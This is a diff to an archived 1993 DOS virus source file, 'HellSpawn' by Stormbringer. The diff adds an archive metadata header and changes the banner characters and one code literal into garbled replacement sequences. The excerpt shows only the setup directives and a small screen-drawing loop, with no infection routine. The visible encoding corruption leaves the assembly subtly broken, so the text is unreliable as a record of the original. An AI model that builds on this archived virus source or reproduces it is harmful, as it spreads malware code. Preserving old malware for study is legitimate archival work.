@@ -1,9 +1,20 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;                HellSpawn Virus (c) 1993 by Stormbringer
 ;
 ;
-;                                                   Ò  Stormbringer
-;                                                 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÄÄÄÄ
-;                                                   Ð
+;                                                   ï¿½  Stormbringer
+;                                                 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
+;                                                   ï¿½
 .model tiny
 .radix 16
 .code
@@ -487,7 +498,7 @@ BtDrawFireLine:
         mov     cx,8
    FireLine:        
         lodsb
-        mov     ah,'Û'
+        mov     ah,'ï¿½'
         xchg    ah,al
         stosw
         loop    FireLine
